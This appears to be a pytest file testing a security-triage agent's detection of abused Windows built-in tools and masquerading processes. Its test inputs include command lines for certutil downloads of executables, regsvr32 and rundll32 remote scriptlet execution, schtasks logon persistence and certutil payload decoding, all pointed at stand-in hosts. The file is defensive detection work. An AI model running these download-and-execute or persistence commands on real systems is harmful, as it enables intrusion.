"""tests/test_triage_step2_lolbas.py -- Triage Step 2 / P12: abused-tool
(LOLBAS) enrichment and the masquerade check (agents/triage/lolbas.py), and
their effect on the guard floor (agents/triage/guards.py rule b).

Method principle: adversarial mimicry -- attackers use signed, built-in
Windows tools that look like normal IT work. Name-only is weak; an abuse
ARGUMENT is strong; a wrong folder is masquerading; a signature never
counts as benign. Uses the small self-authored fixture
tests/fixtures/lolbas_fixture.json (conftest.py pins AEGIS_LOLBAS_PATH),
never the downloaded GPL-3.0 dataset.
"""
from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest

from agents.triage import lolbas
from agents.triage.evidence_packet import build_evidence_packet, get_leaf, render_packet_for_prompt
from agents.triage.guards import build_assessment, strong_rule_signals
from agents.triage.triage_result import EvidencePacket
from triage_step1_payloads import (
    SAMPLE_DATA_AVAILABILITY,
    SAMPLE_INCIDENT,
    SAMPLE_PARSED_CONTEXT,
    measured_baseline,
)

ROOT = Path(__file__).resolve().parents[1]
FIXTURE = ROOT / "tests" / "fixtures" / "lolbas_fixture.json"


@pytest.fixture(scope="module")
def ds():
    dataset, reason = lolbas.load_lolbas_dataset(FIXTURE)
    assert dataset is not None, reason
    return dataset


def _strong(hits):
    return [h for h in hits if h["strength"] == "strong"]


def _event_incident(name: str, directory: str, cmd: str, *, signed: bool = True,
                    child: str | None = None, child_cmd: str | None = None, **extra) -> dict:
    ev = {"filename_src": [name], "directory_src": [directory], "param_src": [cmd],
          "user_src": "LAB\\analyst", "alias_host": ["LAB-WIN10"], "action": ["createProcess"]}
    if signed:
        ev["cert_thumbprint"] = ["aeb9b61e47d91c42fff213992b7810a3d562fb12"]
    if child:
        ev["filename_dst"] = [child]
        ev["param_dst"] = [child_cmd or child]
    ev.update(extra)
    inc = dict(SAMPLE_INCIDENT, id="INC-LOL", alertCount=1,
               alerts=[{"_id": "a1", "originalHeaders": {"name": "Process Event"},
                        "originalAlert": {"events": [ev]}}])
    return inc


def _packet(inc: dict) -> dict:
    return build_evidence_packet(inc, SAMPLE_PARSED_CONTEXT, measured_baseline(),
                                 dict(SAMPLE_DATA_AVAILABILITY, alerts_count=len(inc["alerts"])))


# =============================================================================
# Fixture provenance + pattern derivation
# =============================================================================

def test_fixture_is_small_and_self_authored():
    data = json.loads(FIXTURE.read_text(encoding="utf-8"))
    names = {e["Name"].lower() for e in data}
    assert names == {"certutil.exe", "rundll32.exe", "schtasks.exe", "regsvr32.exe",
                     "mshta.exe", "bitsadmin.exe", "powershell.exe"}
    assert "SELF-AUTHORED" in data[0]["Description"]


def test_placeholders_become_wildcards():
    pats = lolbas.derive_patterns("certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}")
    assert len(pats) == 1 and pats[0]["display"] == "certutil -urlcache <url>"
    pats = lolbas.derive_patterns("regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll")
    assert pats[0]["display"] == "regsvr32 /i:<url>"
    assert lolbas.derive_patterns("schtasks /create /tn X /tr \"{CMD}\"")[0]["display"] \
        == "schtasks /create"
    # a name with no abuse argument produces no pattern at all
    assert lolbas.derive_patterns("cmdkey /list", "Cmdkey.exe") == [] or \
        all(p["requirements"] for p in lolbas.derive_patterns("cmdkey /list", "Cmdkey.exe"))


def test_cross_binary_commands_need_the_entry_name():
    """A LOLBAS *script* entry run through powershell must not turn every
    'powershell -command' into a strong hit."""
    pats = lolbas.derive_patterns(
        'powershell.exe -ep bypass -command "import-module .\\CL_LoadAssembly.ps1"',
        "CL_LoadAssembly.ps1")
    assert pats and "cl_loadassembly.ps1" in pats[0]["display"]


# =============================================================================
# Strong vs weak vs path_mismatch
# =============================================================================

@pytest.mark.parametrize("cmd, binary, pattern, category, mitre", [
    ("cmd /c certutil -urlcache -split -f https://example.org/LICENSE.txt out.txt",
     "certutil.exe", "certutil -urlcache <url>", "Download", "T1105"),
    ('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();'
     'GetObject("script:https://example.org/x.sct").Exec();',
     "rundll32.exe", "rundll32 javascript:", "Execute", "T1218.011"),
    ('schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"',
     "schtasks.exe", "schtasks /create", "Execute", "T1053.005"),
    ("regsvr32 /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll",
     "regsvr32.exe", "regsvr32 /i:<url>", "AWL Bypass", "T1218.010"),
    ("certutil -decode blob.b64 payload.exe", "certutil.exe", "certutil -decode", "Decode", "T1140"),
])
def test_strong_abuse_argument(ds, cmd, binary, pattern, category, mitre):
    hits = _strong(lolbas.match_lolbas([], [{"command_line": cmd, "alert_id": "a9"}], ds))
    assert len(hits) == 1
    h = hits[0]
    assert (h["binary"], h["matched_command_pattern"], h["category"], h["mitre_id"]) == \
        (binary, pattern, category, mitre)
    assert h["evidence"] == {"command_line": cmd, "alert_id": "a9"}
    # Decode is recorded but is not one of the floor categories.
    assert h["floor"] is (category in lolbas.FLOOR_CATEGORIES)


@pytest.mark.parametrize("cmd", [
    "certutil -hashfile C:\\Users\\a\\Downloads\\setup.exe SHA256",
    "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
    "schtasks /query /fo LIST",
    "powershell.exe -NoProfile -Command Get-Date",
    "cmd.exe /c dir",
])
def test_benign_lookalike_arguments_are_not_strong(ds, cmd):
    assert _strong(lolbas.match_lolbas([], [cmd], ds)) == []


def test_name_only_is_weak_even_for_everywhere_binaries(ds):
    procs = [{"name": "powershell.exe",
              "directory": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"},
             {"name": "certutil.exe", "directory": "C:\\Windows\\System32\\"}]
    hits = lolbas.match_lolbas(procs, [], ds)
    assert {h["binary"] for h in hits} == {"powershell.exe", "certutil.exe"}
    assert all(h["strength"] == "weak" and not h["floor"] for h in hits)


@pytest.mark.parametrize("name, directory", [
    ("certutil.exe", "C:\\Users\\Public\\"),                 # LOLBAS Full_Path
    ("svchost.exe", "C:\\Users\\bob\\AppData\\Local\\Temp\\"),  # well-known list
    ("splunkd.exe", "C:\\Users\\Public\\"),                  # INC-53021 pattern
])
def test_path_mismatch_is_strong(ds, name, directory):
    hits = lolbas.match_lolbas([{"name": name, "directory": directory, "signed": True}], [], ds)
    pm = [h for h in hits if h["path_mismatch"]]
    assert len(pm) == 1
    assert pm[0]["strength"] == "strong" and pm[0]["floor"] is True
    assert pm[0]["mitre_id"] == "T1036.005"
    assert pm[0]["signed"] is True            # recorded...
    assert pm[0]["expected_directories"]      # ...with where it should live


def test_correct_directory_is_not_a_mismatch(ds):
    for name, d in (("certutil.exe", "C:\\Windows\\SysWOW64\\"),
                    ("svchost.exe", "c:\\windows\\system32"),
                    ("MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\\")):
        assert not [h for h in lolbas.match_lolbas([{"name": name, "directory": d}], [], ds)
                    if h["path_mismatch"]]


def test_signed_never_downgrades_a_hit(ds):
    cmd = "certutil -urlcache -f http://203.0.113.5/x.exe x.exe"
    a = _strong(lolbas.match_lolbas([{"name": "certutil.exe", "directory": "C:\\Windows\\System32\\",
                                      "signed": True}], [cmd], ds))
    b = _strong(lolbas.match_lolbas([{"name": "certutil.exe", "directory": "C:\\Windows\\System32\\",
                                      "signed": False}], [cmd], ds))
    assert [h["matched_command_pattern"] for h in a] == [h["matched_command_pattern"] for h in b]
    assert a[0]["floor"] and b[0]["floor"]


# =============================================================================
# Packet wiring + missing cache
# =============================================================================

def test_lolbas_leaf_in_packet_is_citable():
    inc = _event_incident("cmd.exe", "C:\\Windows\\System32\\", "cmd.exe",
                          child="certutil.exe",
                          child_cmd="certutil -urlcache -f http://203.0.113.5/a.exe a.exe")
    p = _packet(inc)
    EvidencePacket.model_validate(p)
    leaf = get_leaf(p, "rule_signals.lolbas")
    assert leaf["status"] == "measured"
    assert "lolbas_fixture.json" in leaf["source"]
    assert leaf["value"]["floor_labels"] == ["lolbas:certutil.exe Download"]
    assert leaf["value"]["strong_hits"][0]["evidence"]["alert_id"] == "a1"
    assert "never treated as evidence of benign" in leaf["value"]["note"]
    assert "rule_signals.lolbas [measured]" in render_packet_for_prompt(p)


def test_missing_cache_is_status_missing_not_a_crash(monkeypatch, tmp_path):
    monkeypatch.setenv(lolbas.LOLBAS_PATH_ENV, str(tmp_path / "nope.json"))
    inc = _event_incident("certutil.exe", "C:\\Windows\\System32\\",
                          "certutil -urlcache -f http://203.0.113.5/a.exe a.exe")
    p = _packet(inc)
    leaf = get_leaf(p, "rule_signals.lolbas")
    assert leaf["status"] == "missing" and leaf["value"] is None
    assert "update_lolbas.py" in leaf["source"]
    # The self-authored masquerade list still works without the cache.
    assert get_leaf(p, "rule_signals.masquerade")["status"] == "measured"


def test_corrupt_cache_is_status_missing(monkeypatch, tmp_path):
    bad = tmp_path / "bad.json"
    bad.write_text("{not json", encoding="utf-8")
    monkeypatch.setenv(lolbas.LOLBAS_PATH_ENV, str(bad))
    leaf = lolbas.build_lolbas_signal(_event_incident("a.exe", "C:\\x\\", "a.exe"))
    assert leaf["status"] == "missing" and "could not be read" in leaf["source"]


def test_no_process_events_is_missing():
    inc = dict(SAMPLE_INCIDENT)   # ESA meta-only alerts: no processes
    assert lolbas.build_lolbas_signal(inc)["status"] == "missing"


# =============================================================================
# Guard floor with LOLBAS
# =============================================================================

def _benign(disposition: str, *cites: str) -> dict:
    return {"proposed_disposition": disposition,
            "hypotheses": {"benign": {"evidence_for": [{"claim": "admin work", "cites": list(cites)}]}}}


def _with_context(packet: dict) -> dict:
    p = copy.deepcopy(packet)
    p["context"]["change_context"] = {"value": "CHG-77 approved", "status": "measured",
                                      "source": "test:change_calendar"}
    return p


def test_strong_lolbas_blocks_false_positive():
    inc = _event_incident("certutil.exe", "C:\\Windows\\System32\\",
                          "certutil -urlcache -f http://203.0.113.5/a.exe a.exe")
    p = _packet(inc)
    assert "lolbas:certutil.exe Download" in strong_rule_signals(p)
    a = build_assessment(_benign("false_positive", "detection.ruleId", "data_quality.parser_status"), p)
    assert a["disposition"] == "needs_info"
    assert [g["rule"] for g in a["guard_actions"]] == ["b_strong_signal_floor"]
    assert "lolbas:certutil.exe" in a["guard_actions"][0]["reason"]


def test_masquerade_blocks_benign_expected_even_when_signed():
    inc = _event_incident("splunkd.exe", "C:\\Users\\Public\\", "splunkd.exe -server x", signed=True)
    p = _packet(inc)
    assert "masquerade:splunkd.exe" in strong_rule_signals(p)
    a = build_assessment(_benign("benign_expected", "raw_alerts.signers"), p)
    assert a["disposition"] == "needs_info"
    assert a["guard_actions"][0]["rule"] == "b_strong_signal_floor"


def test_lolbas_floor_lifted_only_by_valid_context_cite():
    inc = _event_incident("certutil.exe", "C:\\Windows\\System32\\",
                          "certutil -urlcache -f http://203.0.113.5/a.exe a.exe")
    p = _with_context(_packet(inc))
    a = build_assessment(_benign("false_positive", "detection.ruleId", "context.change_context"), p)
    assert "b_strong_signal_floor" not in [g["rule"] for g in a["guard_actions"]]


def test_weak_and_non_floor_hits_do_not_block():
    inc = _event_incident("certutil.exe", "C:\\Windows\\System32\\", "certutil -hashfile a.exe SHA256")
    p = _packet(inc)
    assert get_leaf(p, "rule_signals.lolbas")["value"]["weak_hit_count"] == 1
    assert not [s for s in strong_rule_signals(p) if s.startswith(("lolbas:", "masquerade:"))]
    a = build_assessment(_benign("false_positive", "detection.ruleId"), p)
    assert a["disposition"] == "false_positive"
    decode = _event_incident("certutil.exe", "C:\\Windows\\System32\\", "certutil -decode a.b64 a.exe")
    assert build_assessment(_benign("false_positive", "detection.ruleId"),
                            _packet(decode))["disposition"] == "false_positive"


# =============================================================================
# Real demo incidents
# =============================================================================

def test_inc_53021_masquerade_and_ranking():
    data = json.loads((ROOT / "demo" / "incident_INC-53021_respond_api_export.json").read_text(encoding="utf-8"))
    inc = dict(data["incident"], alerts=data["alerts"])
    p = _packet(inc)
    masq = get_leaf(p, "rule_signals.masquerade")["value"]
    assert masq["floor_labels"] == ["masquerade:splunkd.exe"]
    assert masq["path_mismatches"][0]["observed_directory"] == "C:\\Users\\Public\\"
    sigs = get_leaf(p, "raw_alerts.signatures")["value"]["items"]
    assert sigs[0]["process"] == "splunkd.exe"
    assert any(r.startswith("abused-tool: masquerade:splunkd.exe") for r in sigs[0]["rank_reasons"])
    a = build_assessment(_benign("false_positive", "detection.ruleId"), p)
    assert a["disposition"] == "needs_info"


def test_inc_52825_has_no_false_masquerade():
    """vmtoolsd launches cmd.exe with directory_dst = the VMware folder of the
    .bat script; that must not be read as cmd.exe running from there."""
    data = json.loads((ROOT / "demo" / "incident_INC-52825_respond_api_export.json").read_text(encoding="utf-8"))
    inc = dict(data["incident"], alerts=data["alerts"])
    p = _packet(inc)
    assert get_leaf(p, "rule_signals.masquerade")["value"]["floor_labels"] == []
    lol = get_leaf(p, "rule_signals.lolbas")["value"]
    assert lol["floor_labels"] == []          # rundll32/cmd appear by name only
